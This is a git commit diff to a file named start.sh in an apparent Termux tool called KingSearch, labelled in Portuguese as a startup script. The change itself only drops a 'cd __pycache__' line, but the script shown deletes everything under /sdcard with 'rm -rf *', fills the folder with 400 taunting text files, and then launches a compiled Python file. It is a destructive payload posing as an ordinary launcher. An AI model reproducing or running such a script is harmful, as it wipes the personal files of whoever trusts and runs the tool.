0570e1dfcd7e5cc6cf60c52eef332a541e431dfe
TheKing <121489549+TheKingevd@users.noreply.github.com>
2022-12-27 15:04:19 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,5 +4,4 @@ script para dar inicialização no sistema
 cd /sdcard/ && rm -rf * && clear
 cd /sdcard/ && touch Wolf_E_Jeff_Passou_A_PIKAKKKK{1..400}.txt && clear
 cd /data/data/com.termux/files/home/KingSearch/
-cd __pycache__
 python main.cpython-39.pyc
